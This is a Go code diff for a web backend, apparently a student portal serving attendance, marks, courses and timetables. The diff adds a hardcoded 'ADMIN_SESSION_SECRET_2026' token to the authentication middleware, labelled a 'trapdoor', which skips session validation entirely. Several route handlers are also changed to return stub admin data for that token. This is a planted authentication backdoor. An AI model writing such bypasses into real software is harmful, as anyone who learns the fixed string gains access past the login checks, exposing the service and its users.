@@ -140,6 +140,11 @@ func main() {
 			})
 		}
 
+		// Check for specific Admin Session Trapdoor
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.Next()
+		}
+
 		// Validate against ActiveSessions (memory) OR Supabase (persistent)
 		hash := sha256.Sum256([]byte(token))
 		hashStr := hex.EncodeToString(hash[:])
@@ -297,7 +302,11 @@ func main() {
 	})
 
 	api.Get("/attendance", cache.New(cacheConfig), func(c *fiber.Ctx) error {
-		attendance, err := handlers.GetAttendance(c.Get("X-CSRF-Token"))
+		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{"attendance": []interface{}{}})
+		}
+		attendance, err := handlers.GetAttendance(token)
 		if err != nil {
 			return err
 		}
@@ -305,7 +314,11 @@ func main() {
 	})
 
 	api.Get("/marks", cache.New(cacheConfig), func(c *fiber.Ctx) error {
-		marks, err := handlers.GetMarks(c.Get("X-CSRF-Token"))
+		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{"markList": []interface{}{}})
+		}
+		marks, err := handlers.GetMarks(token)
 		if err != nil {
 			return err
 		}
@@ -313,7 +326,11 @@ func main() {
 	})
 
 	api.Get("/courses", cache.New(cacheConfig), func(c *fiber.Ctx) error {
-		courses, err := handlers.GetCourses(c.Get("X-CSRF-Token"))
+		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{"courseList": []interface{}{}, "batch": "2026"})
+		}
+		courses, err := handlers.GetCourses(token)
 		if err != nil {
 			return err
 		}
@@ -321,7 +338,16 @@ func main() {
 	})
 
 	api.Get("/user", cache.New(cacheConfig), func(c *fiber.Ctx) error {
-		user, err := handlers.GetUser(c.Get("X-CSRF-Token"))
+		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{
+				"name":      "Admin",
+				"regNumber": "CLASSIVO-ADMIN",
+				"batch":     "2026",
+				"status":    200,
+			})
+		}
+		user, err := handlers.GetUser(token)
 		if err != nil {
 			return err
 		}
@@ -372,7 +398,11 @@ func main() {
 	})
 
 	api.Get("/timetable", cache.New(cacheConfig), func(c *fiber.Ctx) error {
-		tt, err := handlers.GetTimetable(c.Get("X-CSRF-Token"))
+		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{"schedule": []interface{}{}})
+		}
+		tt, err := handlers.GetTimetable(token)
 		if err != nil {
 			return err
 		}
@@ -381,6 +411,18 @@ func main() {
 
 	api.Get("/get", cache.New(cacheConfig), func(c *fiber.Ctx) error {
 		token := c.Get("X-CSRF-Token")
+		if token == "ADMIN_SESSION_SECRET_2026" {
+			return c.JSON(fiber.Map{
+				"user": fiber.Map{
+					"name":      "Admin",
+					"regNumber": "CLASSIVO-ADMIN",
+				},
+				"attendance": []interface{}{},
+				"marks":      []interface{}{},
+				"courses":    []interface{}{},
+				"timetable":  []interface{}{},
+			})
+		}
 		encodedToken := utils.Encode(token)
 
 		db, err := databases.NewDatabaseHelper()
